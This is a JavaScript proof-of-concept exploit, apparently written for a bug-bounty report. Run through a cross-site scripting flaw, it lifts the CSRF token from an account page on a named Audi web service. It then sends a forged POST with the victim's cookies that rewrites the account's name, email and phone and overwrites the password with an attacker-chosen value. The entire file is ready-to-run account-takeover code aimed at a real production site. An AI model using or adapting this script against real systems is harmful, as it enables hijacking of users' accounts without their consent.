// Auto-CSRF exploit for osa2.audi.de (runs only inside Audi domain via XSS)
(function () {

    // --- 1. extract CSRF token from DOM ---
    const token = document.querySelector("input[name='CSRFToken']")?.value;
    if (!token) return;

    // --- 2. construct POST body (attacker-controlled values) ---
    const params = new URLSearchParams({
        dividerPos: "0",
        mouseX: "1065",
        mouseY: "280",
        focusElement: "userPasswordNew2",
        browser: "-422d1c48:19acb3cc742:-7da6$1",
        control: "43694",
        event: "click",
        eventValue: "",
        CSRFToken: token,  // dynamic token
        submit: "Submit+Query",

        // attacker-chosen victim modifications:
        j_43697: "hackedName",
        j_43699: "hackedLast",
        j_43704: "autoInjected",
        j_43708: "XSSimpact",
        j_43715: "domHijack",
        j_43717: "naysser@bugcrowdninja.com",
        j_43719: "+19999999999",

        // password overwrite demo:
        j_43734: "NewPass!2025",
        j_43736: "NewPass!2025",

        j_43739: "true",
        j_43688: "0",
        j_43685: "0",
        domainScrollPos: "0",
        j_43695: "Frau"
    });

    // --- 3. send the forged POST request using victim cookies ---
    fetch("https://osa2.audi.de/ve/ns_content.jsp", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: params.toString()
    });

})();
